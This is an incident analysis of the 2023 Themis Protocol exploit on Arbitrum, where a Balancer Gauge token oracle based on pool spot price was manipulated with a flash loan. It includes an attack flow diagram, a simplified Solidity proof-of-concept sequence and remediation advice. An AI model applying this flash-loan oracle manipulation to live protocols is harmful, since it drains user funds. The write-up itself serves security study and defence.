# Themis Protocol — Balancer Gauge LP Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-27 |
| **Protocol** | Themis Protocol |
| **Chain** | Arbitrum |
| **Loss** | ~370K USD |
| **Attacker** | [0xdb73eb48...](https://arbiscan.io/address/0xdb73eb484e7dea3785520d750eabef50a9b9ab33) |
| **Attack Contract** | [0x05a1b877...](https://arbiscan.io/address/0x05a1b877330c168451f081bfaf32d690ea964fca) |
| **Attack Tx** | [0xff368294...](https://arbiscan.io/tx/0xff368294ccb3cd6e7e263526b5c820b22dea2b2fd8617119ba5c3ab8417403d8) |
| **Vulnerable Contract** | [0x75f805e2...](https://arbiscan.io/address/0x75f805e2fb248462e7817f0230b36e9fae0280fc) |
| **Root Cause** | Balancer Gauge token price relies on manipulable pool spot price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Themis_exp.sol) |

---
## 1. Vulnerability Overview

Themis Protocol allows Balancer pool Gauge tokens (staked BPT) as collateral. The Gauge token price oracle relies on the spot liquidity ratio of the Balancer pool, so manipulating the pool ratio via a flash loan causes the Gauge token collateral value to be overestimated. This is the same Balancer oracle manipulation pattern as Sturdy Finance (same date).

## 2. Vulnerable Code Analysis

```solidity
// ❌ Gauge token price: based on Balancer pool spot price
interface IGauge is IERC20 {
    function deposit(uint256 _amount, address _referrer) external;
}

interface IPool is IERC20 {
    function getPoolId() external view returns (bytes32);
    // ❌ getRate() or getPrice(): spot ratio → manipulable
}

interface IThemis {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode,
                    uint16 referralCode, address onBehalfOf) external;
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Balancer Gauge token price relies on manipulable pool spot price
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌────────────────────────────────────────────────────┐
│  1. Borrow large amount of tokens via Balancer     │
│     flash loan                                     │
└────────────────────────────────────┬───────────────┘
                                     ▼
┌────────────────────────────────────────────────────┐
│  2. Large swap in Balancer pool                    │
│     → Manipulate pool ratio → Inflate Gauge token  │
│       price                                        │
└────────────────────────────────────┬───────────────┘
                                     ▼
┌────────────────────────────────────────────────────┐
│  3. Supply overvalued Gauge tokens as Themis       │
│     collateral                                     │
│  4. setUserUseReserveAsCollateral(Gauge, true)     │
└────────────────────────────────────┬───────────────┘
                                     ▼
┌────────────────────────────────────────────────────┐
│  5. Execute over-collateralized borrow             │
│  6. Restore price + repay flash loan + 370K USD   │
│     profit                                         │
└────────────────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function testExploit() public {
    // 1. Balancer flash loan
    IBalancerVault vault = IBalancerVault(BALANCER_VAULT);
    vault.flashLoan(address(this), tokens, amounts, "");
}

function receiveFlashLoan(...) external {
    // 2. Manipulate Balancer pool ratio
    swapInBalancer(weth, wsteth, amounts[0]);

    // 3. Stake BPT → Gauge tokens
    gauge.deposit(bptBalance, address(this));

    // 4. Supply Gauge as collateral to Themis + enable collateral
    themis.supply(address(gauge), gaugeBalance, address(this), 0);
    themis.setUserUseReserveAsCollateral(address(gauge), true);

    // 5. Over-collateralized borrow
    themis.borrow(address(weth), borrowAmount, 2, 0, address(this));

    // 6. Restore price via reverse swap + repay
    swapInBalancer(wsteth, weth, wstethBalance);
    weth.transfer(address(vault), amounts[0]);
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Balancer Gauge Spot Price Oracle | CRITICAL | CWE-1041 | 04_oracle_manipulation.md |
| V-02 | LP Token Collateral Value Manipulation | HIGH | CWE-682 | 04_oracle_manipulation.md |

## 6. Remediation Recommendations

### Immediate Actions
```solidity
// ✅ Balancer fair price calculation
// 1. Obtain underlying asset prices from an external Chainlink oracle
// 2. Calculate fair BPT price based on pool invariant
// 3. Since Gauge = BPT, apply the same method
```

## 7. Lessons Learned

On the same day, both Sturdy Finance and Themis Protocol were exploited through oracle vulnerabilities based on Balancer pool spot prices. Oracle design for protocols that allow composite LP tokens (BPT/Gauge) as collateral is one of the most vulnerable attack vectors. The BPT price calculation guidelines in the official Balancer documentation must be strictly followed.